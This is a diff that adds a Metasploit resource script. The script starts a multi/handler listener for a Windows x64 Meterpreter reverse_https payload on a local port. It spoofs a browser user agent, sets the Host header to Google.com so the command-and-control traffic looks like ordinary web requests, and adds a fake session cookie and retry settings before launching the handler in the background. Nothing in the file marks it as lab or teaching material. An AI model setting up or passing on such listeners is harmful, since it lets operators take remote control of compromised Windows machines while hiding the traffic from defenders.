@@ -1,0 +1,16 @@
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 127.0.0.1
+set LPORT 7710
+set HttpUserAgent Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.36 (KHTML, like Gecko) Chrome/51.0.0421.103 Safari/533.36
+set HttpHostHeader Google.com
+set HttpCookie SESSIONID=1234567890ABCDEF
+set SessionExpirationTimeout 3600
+set SessionRetryTotal 1800
+set SessionRetryWait 5
+set StagerRetryCount 5
+set StagerRetryWait 3
+set exitonsession false
+set AutoLoadStdapi false
+set VERBOSE true
+exploit -j -z
